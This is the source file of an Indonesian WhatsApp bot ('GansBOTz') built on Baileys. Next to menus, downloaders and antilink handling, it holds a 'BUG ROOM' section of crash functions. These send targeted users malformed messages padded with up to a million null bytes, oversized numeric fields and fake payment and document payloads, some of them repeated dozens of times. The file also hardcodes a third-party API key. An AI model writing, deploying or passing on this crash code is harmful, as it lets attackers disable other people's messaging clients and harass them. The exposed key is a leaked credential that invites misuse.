require('./setting')
const { WA_DEFAULT_EPHEMERAL, MessageType, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, buttonMessage } = require('@whiskeysockets/baileys');

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const cheerio = require('cheerio')
const crypto = require("crypto")
const yts = require("yt-search")
const request = require("request")
const FormData = require('form-data')
const { fromBuffer } = require('file-type');
const { exec, spawn, execSync } = require("child_process")

const fongsi = require('@fongsidev/scraper');
const bocil = require('@bochilteam/scraper');
const dylux = require('api-dylux');
const ruhend = require('ruhend-scraper');
const rahad = require('rahad-all-downloader');
const nayan = require('nayan-server')
const scrap = require('./lib/scrape')

const vip = require("./lib/vip");
const banned = JSON.parse(fs.readFileSync('./data/database/banned.json'))
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, formatp, parseMention, getRandom, resize, readTime, getGroupAdmins } = require('./lib/myfunc')
const ntilink = JSON.parse(fs.readFileSync("./data/database/antilink.json"))
let vipp = JSON.parse(fs.readFileSync('./data/database/vip.json'));

const thumbnail = fs.readFileSync ('./lib/image.jpg')
const thumb = fs.readFileSync ('./lib/image.jpg')
const virgam = fs.readFileSync("./lib/lowdb/index_classex.jpeg");

module.exports = gans = async (gans, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const from = m.key.remoteJid
const botNumber = await gans.decodeJid(gans.user.id)
const isBot = botNumber.includes(m.sender.split("@")[0])
const itsMeGans = [botNumber, `${owner}`].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isVIP = itsMeGans ? true : vip.checkVipUser(m.sender, vipp)
const isBan = banned.includes(m.sender)
const groupMetadata = m.isGroup ? await gans.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const isGroup = m.chat.endsWith('@g.us')
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 

try {
pplu = await gans.profilePictureUrl(anu.id, 'image')
} catch {
pplu = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

const color = (text, color) => {
return !color ? chalk.green(text) : chalk.keyword(color)(text)
}

const bgcolor = (text, bgcolor) => {
return !bgcolor ? chalk.green(text) : chalk.bgKeyword(bgcolor)(text)
}

if (command) {
gans.readMessages([m.key])
}

if (m.message) {
const figlet = require("figlet")
console.log(`\n          Created By`)
console.log(color(figlet.textSync("GansBOTz", {
font: 'Small',
horizontalLayout: 'default',
vertivalLayout: 'default',
width: 50,
whitespaceBreak: false
}), 'blue'))
console.log(
chalk.black(chalk.bgWhite('[ PESAN ]')),
chalk.black(chalk.bgBlue(budy || m.mtype)) +
'\n' +
chalk.magenta('=> Dari'),
chalk.green(m.pushName),
chalk.yellow(m.sender) +
'\n' +
chalk.blueBright('=> Di'),
chalk.green(m.isGroup ? m.pushName : 'Private Chat', from) +
'\n' +
chalk.red.bold('<======================================================>')
);
}

try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = itsMeGans ? 1000 : limitawal
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.limit)) user.limit = limitUser
if (!isNumber(user.afkTime)) user.afkTime = -1

} else global.db.data.users[m.sender] = {
name: pushname,
limit: limitUser,
afkTime: -1,
afkReason: '',
}
} catch (err) {
console.log(err)
}

//===========ALL FUNCTION=============\\
let limitnya = db.data.users[m?.sender].limit

async function top4top(baper) {
	return new Promise(async (resolve, reject) => {
		const {
			ext
		} = await fromBuffer(baper) || {}
		var req = await request({
				url: "https://top4top.io/index.php",
				method: "POST",
				"headers": {
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"accept-language": "en-US,en;q=0.9,id;q=0.8",
					"cache-control": "max-age=0",
					'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryAmIhdMyLOrbDawcA',
					'User-Agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.585 Mobile Safari/534.11+'
				}
			},
			function(error, response, body) {
				if (error) { return resolve({
					result: 'error'
				}) }
				const $ = cheerio.load(body)
				let result = $('div.alert.alert-warning > ul > li > span').find('a').attr('href') || "gagal"
				if (result == "gagal") {
					resolve({
						status: "error",
						msg: "maybe file not allowed or try another file"
					})
				}
				resolve({
					status: "sukses",
					result
				})
			});
		let form = req.form()
		form.append('file_1_', baper, {
			filename: `${Math.floor(Math.random() * 10000)}.` + `${ext}`
		})
		form.append('file_1_', '')
		form.append('submitr', '[ رفع الملفات ]')
	})
}

async function uploadToFileio(filePath) {
    return new Promise(async (resolve, reject) => {
        if (!fs.existsSync(filePath)) return reject(new Error("File tidak ditemukan"));
        try {
            const form = new FormData();
            form.append('file', fs.createReadStream(filePath));

            const response = await axios({
                method: 'post',
                url: 'https://file.io',
                headers: {
                    ...form.getHeaders()
                },
                data: form
            });
            const fileUrl = response.data.link;
            resolve(fileUrl);
        } catch (error) {
            reject(new Error(`Error upload ke File.io: ${error.message}`));
        }
    });
}
async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
url: "https://api.remove.bg/v1.0/removebg",
method: "POST",
data: form,
responseType: "arraybuffer",
headers: {
"X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
...form.getHeaders()
}
})
return res.data
}



//#########Fake Reply Message##########\\
const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
const Ganss = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                "contactMessage": {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Ganss,;;;\nFN: Zʏɴxᴢᴏ\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': pplu,
                    thumbnail: pplu,
                    sendEphemeral: true
                }   
            }
        }

//function teks
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
const reply = async(teks) => {gans.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:fcall})}

//###########FUNCTION BUG ROOM############\\
async function sendBugDeff(jid) {
      for (let p = '3'; p !== 0; p -= 1) {
        const sund = {
          deviceListMetadataVersion: 2,
          deviceListMetadata: {}
        };
        const send = {
          name: "payment_info",
          buttonParamsJson: "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🧷𝔄𝔩𝔴𝔞𝔶𝔰𝔞𝔮𝔦𝔬𝔬 المطور\",\"key\":\"+916909137213\",\"key_type\":\"X\"}}]}"
        };
        const buttt = {
          buttons: [send]
        };
        const superFlows = {
          nativeFlowMessage: buttt
        };
        const messC = {
          messageContextInfo: sund,
          interactiveMessage: superFlows
        };
        const messageC = {
          message: messC
        };
        const viewsOM = {
          viewOnceMessage: messageC
        };
        const messId = {
          messageId: null
        };
        await gans.relayMessage(jid, viewsOM, {
          'participant': {
            'jid': jid
          }
        }, messId);
      }
      for (let j = '3'; j !== 0; j -= 1) {
        const isian = {
          title: '',
          subtitle: " "
        };
        const teks = {
          text: "🧷𝔄𝔩𝔴𝔞𝔶𝔰𝔞𝔮𝔦𝔬𝔬 المطور 🧷𝔄𝔩𝔴𝔞𝔶𝔰𝔞𝔮𝔦𝔬𝔬 المطور 🧷𝔄𝔩𝔴𝔞𝔶𝔰𝔞𝔮𝔦𝔬𝔬 المطور"
        };
        const behh = {
          text: 'xp'
        };
        const urlBtn = {
          name: "cta_url",
          buttonParamsJson: "{ display_text : '𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎', url : '', merchant_url : '' }"
        };
        await gans.relayMessage(jid, {
          'viewOnceMessage': {
            'message': {
              'interactiveMessage': {
                'header': isian,
                'body': teks,
                'footer': behh,
                'nativeFlowMessage': {
                  'buttons': [urlBtn],
                  'messageParamsJson': "\0".repeat(1000000)
                }
              }
            }
          }
        }, {
          'participant': {
            'jid': jid
          }
        });
      }
    }
    async function sendDocBugDeff(jid, quot) {
      var msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'documentMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          'mimetype': "penis",
          'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          'fileLength': "999999999",
          'pageCount': 999999999,
          'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          'fileName': "𝕬𝖑𝖜𝖆𝖞𝖘𝖆𝖖𝖎𝖔𝖔 𝕮𝖗𝖆𝖘𝖍☠️",
          'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          'directPath': "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          'mediaKeyTimestamp': "1715880173"
        }
      }), {
        'userJid': jid,
        'quoted': quot
      });
      await gans.relayMessage(jid, msg.message, {
        'participant': {
          'jid': jid
        },
        'messageId': msg.key.id
      });
    }
    async function sendDocBugQio(jid, quote) {
      var msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'documentMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          'mimetype': "penis",
          'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          'fileLength': "999999999",
          'pageCount': 999999999,
          'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          'fileName': "Darkness 㐅 " + botname,
          'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          'directPath': "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          'mediaKeyTimestamp': "1715880173"
        }
      }), {
        'userJid': jid,
        'quoted': quote
      });
      await gans.relayMessage(jid, msg.message, {
        'participant': {
          'jid': jid
        },
        'messageId': msg.key.id
      });
    }
    async function sendPayBugMessage(jid) {
      gans.relayMessage(jid, {
        'paymentInviteMessage': {
          'serviceType': "UPI",
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 1814400000
        }
      }, {
        'participant': {
          'jid': jid
        }
      });
    }
    const quott = {
      remoteJid: "0@s.whatsapp.net"
    };
    const fakeR = {
      'fromMe': [],
      'participant': '',
      ...(from ? quott : {})
    };
    const fakeRusher = {
      'key': fakeR,
      'message': {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 1814400000,
          'title': 'al',
          'title': botname
        }
      }
    };
    async function sendDocBugDef(jid, quoted) {
      spywarefiles = fs.readFileSync("./lib/lowdb/adapters/WAsocket.html");
      var msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'documentMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          'mimetype': "penis",
          'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          'fileLength': "999999999",
          'pageCount': 999999999,
          'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          'fileName': '' + spywarefiles,
          'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          'directPath': "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          'mediaKeyTimestamp': "1715880173"
        }
      }), {
        'userJid': jid,
        'quoted': quoted
      });
      await gans.relayMessage(jid, msg.message, {
        'participant': {
          'jid': jid
        },
        'messageId': msg.key.id
      });
    }
    async function sendBugGanas(jid) {
      const devlist = {
        deviceListMetadataVersion: 2,
        deviceListMetadata: {}
      };
      const vallueO = {
        value: 0,
        offset: 64
      };
      const vallueOff = {
        value: 0,
        offset: 64
      };
      const vallueOffs = {
        value: 0,
        offset: 64
      };
      const vallueOffsets = {
        value: 0,
        offset: 64
      };
      const naqS = {
        name: '',
        amount: vallueOffs,
        quantity: 0,
        sale_amount: vallueOffsets
      };
      const messID = {
        messageId: null
      };
      await gans.relayMessage(jid, {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': devlist,
            'interactiveMessage': {
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "payment_info",
                  'buttonParamsJson': JSON.stringify({
                    'currency': "BRL",
                    'total_amount': vallueO,
                    'reference_id': "4P46GMY57GC",
                    'type': "physical-goods",
                    'order': {
                      'status': "pending",
                      'subtotal': vallueOff,
                      'order_type': "ORDER",
                      'items': [naqS]
                    },
                    'payment_settings': [{
                      'type': "pix_static_code",
                      'pix_static_code': {
                        'merchant_name': "meu ovo",
                        'key': "+5533998586057",
                        'key_type': 'X'
                      }
                    }]
                  })
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': jid
        }
      }, messID);
    }
async function buttonMessageBUG(jid) {
      const msg = {
        hasMediaAttachment: true,
        sequenceNumber: '0',
        jpegThumbnail: ''
      };
      var mssg = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': msg,
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "payment_info",
                  'buttonParamsJson': "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🧷𝔄𝔩𝔴𝔞𝔶𝔰𝔞𝔮𝔦𝔬𝔬 المطور\",\"key\":\"+916909137213\",\"key_type\":\"X\"}}]}"
                }],
                'messageParamsJson': "\0".repeat(10000)
              }
            }
          }
        }
      }), {
        'userJid': jid
      });
      await gans.relayMessage(jid, mssg.message, {
        'participant': {
          'jid': jid
        },
        'messageId': mssg.key.id
      });
    }
    async function sendBugListType(jid) {
      const productt = {
        product_header_info_id: 0xf316271c7fc3900000000000000000000000000000000000000000,
        product_header_is_rejected: true,
        product_header_is_rejected: null,
        product_header_is_rejected: false,
        product_header_is_rejected: true,
        product_header_is_rejected: null,
        product_header_is_rejected: false,
        product_header_is_rejected: true,
        product_header_is_rejected: null,
        product_header_is_rejected: false,
        product_header_is_rejected: true,
        product_header_is_rejected: null,
        product_header_is_rejected: false,
        product_header_is_rejected: true,
        product_header_is_rejected: null,
        product_header_is_rejected: false
      };
      var msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'listMessage': {
          'title': " " + "\0".repeat(920000),
          'footerText': " ",
          'description': " ",
          'buttonText': null,
          'listType': 2,
          'productListInfo': {
            'productSections': [{
              'title': "button",
              'products': [{
                'productId': "9999999999999999999999999999999999990"
              }]
            }],
            'productListHeaderImage': {
              'productId': "999999999999999999999999999999999999990",
              'jpegThumbnail': virgam
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': '' + botname,
        'contextInfo': {
          'expiration': 10000000000000000213204190094543968723012578712679649467743338496,
          'ephemeralSettingTimestamp': "9999999999999999999999999999999999990",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 10000000000000000213204190094543968723012578712679649467743338496,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 2,
        'product_header_info': productt
      }), {
        'userJid': jid
      });
      await gans.relayMessage(jid, msg.message, {
        'participant': {
          'jid': jid
        },
        'messageId': msg.key.id
      });
    }
    async function messageBugSystem(jid) {
      const tSub = {
        title: '',
        subtitle: " "
      };
      const tteks = {
        text: true,
        text: false,
        text: null
      };
      var msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': tSub,
              'body': {
                'text': "𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎"
              },
              'footer': tteks,
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '🧷𝔄𝔩𝔴𝔞𝔶𝔰𝔞𝔮𝔦𝔬𝔬 المطور', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(1000000)
              }
            }
          }
        }
      }), {
        'userJid': jid
      });
      await gans.relayMessage(jid, msg.message, {
        'participant': {
          'jid': jid
        },
        'messageId': msg.key.id
      });
    }
    async function messageBugIDR(jid) {
      const hsjImage = {
        hasMediaAttachment: true,
        sequenceNumber: '0',
        jpegThumbnail: ''
      };
      var msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': hsjImage,
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "review_and_pay",
                  'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + botname + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                'messageParamsJson': "\0".repeat(10000)
              }
            }
          }
        }
      }), {
        'userJid': jid
      });
      await gans.relayMessage(jid, msg.message, {
        'participant': {
          'jid': jid
        },
        'messageId': msg.key.id
      });
    }
    async function sendMessageCrash(jid) {
      await messageBugIDR(jid);
      await messageBugIDR(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await messageBugSystem(jid);
      await messageBugSystem(jid);
      await messageBugIDR(jid);
      await messageBugIDR(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await messageBugIDR(jid);
      await messageBugIDR(jid);
      await sendBugListType(jid);
    }
    async function sendCrashMessage(jid) {
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await messageBugIDR(jid);
    }
    async function sendMessageBugCrash(jid) {
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await messageBugSystem(jid);
      await messageBugSystem(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
      await sendBugListType(jid);
    }
    
//###########Function BUTTON############\\
 gans.sendButText = async(text, footer, button = [], quoted) => {
let msg = generateWAMessageFromContent(m.chat, { 
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: text
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: footer,
hasMediaAttachment: true
}),

contextInfo: { 
mentionedJid: [m.sender], 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: '120363294462602924@newsletter',
newsletterName: '🔵 GansBOTz By Deffri Gans', 
serverMessageId: -1
}
}, 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: button,
})
})
}
}
}, {
quoted:quoted
},{})
await gans.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
}
gans.sendButtonMedia = async(jid, text, footer, media, button = [], quoted) => {
let msgii = generateWAMessageFromContent(jid, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: text
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: footer
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia(media, { upload: gans.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: button
}) 
})} 
}}, {userJid: jid, quoted: quoted}) 
await gans.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
}

if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply(`Antilink telah diaktifkan tetapi bot bukan admin`)
let gclink = (`https://chat.whatsapp.com/`+await gans.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return gans.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return gans.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (itsMeGans) return gans.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await gans.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
gans.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}

//=================================≠===≠=====\\
function pickRandom(arr) {
return arr[Math.floor(Math.random() * arr.length)];
    }

switch(command) {
case 'm': case 'menu': {
let cap = `

\`𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙎𝘾 𝘾𝙊𝘿𝙀𝙋𝙇𝙐𝙂𝙏𝙀𝘼𝙈 [𝘾.𝘿.𝙏]\`
\`𝙎𝙀𝙇𝘼𝙈𝘼𝙏 𝙈𝙀𝙉𝘾𝙊𝘽𝘼 𝙐𝙉𝙏𝙐𝙆 𝙈𝙀𝙉𝘼𝙈𝙋𝙄𝙇𝙆𝘼𝙉 𝙎𝙀𝙈𝙐𝘼 𝙈𝙀𝙉𝙐 𝙎𝙄𝙇𝘼𝙃𝙆𝘼𝙉 𝙆𝙀𝙏𝙄𝙆 𝘽𝙐𝙏𝙏𝙊𝙉 𝙔𝘼𝙉𝙂 𝙆𝘼𝙈𝙄 𝙎𝙀𝘿𝙄𝘼 𝙆𝘼𝙉 𝘿𝙄 𝘽𝘼𝙒𝘼𝙃\`


\`𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝘼𝘿𝙈𝙄𝙉\`

*[ DEFF GANSS ]*
https://youtube.com/@survivofc
*[ DEV OF SCRIPT BOT WhatsApp ]*

`
let button = [{
"name": "quick_reply",
"buttonParamsJson": JSON.stringify({
display_text: 'ALL MENU', 
id: `.1`,
})
},
{
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Developer\",\"url\":\"https://wa.me/6289630721021\",\"merchant_url\":\"https://wa.me/6289630721021\"}"
}]
let media = { 
image: await fs.readFileSync("./lib/image.jpg")
 }
gans.sendButtonMedia(m.chat, cap, 'codeplugteam', media, button, m)
}
break
case '1': {
let menunya = `Hai ${m.pushName}
╔═════╡${botname}╞═════╊
╠• ɴᴀᴍᴇ: ${m.pushName}
╠• sᴛᴀᴛᴜs: ${itsMeGans ? 'owner' : 'user'}
╠• ᴠɪᴘ: ${isVIP ? 'MEMBER VIP' : 'NOT VIP'}
╚══════════════┉

╭──┨ALL MENU┃┄
│┌───᚜𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔᚛ᚅ
│┝ pengguna del/add ( ban )
│┝ addvip
│┝ delvip
│┝ listvip
│┝ listban
│┕━┉┉┉┉┉┉┉┉┉┉┉┉ᚋ
│┌──᚜𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔᚛ᚅ
│┝ yts
│┝ 𝚢𝚝𝚖𝚙3
│┝ 𝚢𝚝𝚖𝚙4
│┝ 𝚝𝚒𝚔𝚝𝚘𝚔
│┝ tiktokslide
│┝ tiktoksearch
│┝ 𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖
│┝ 𝚙𝚕𝚊𝚢
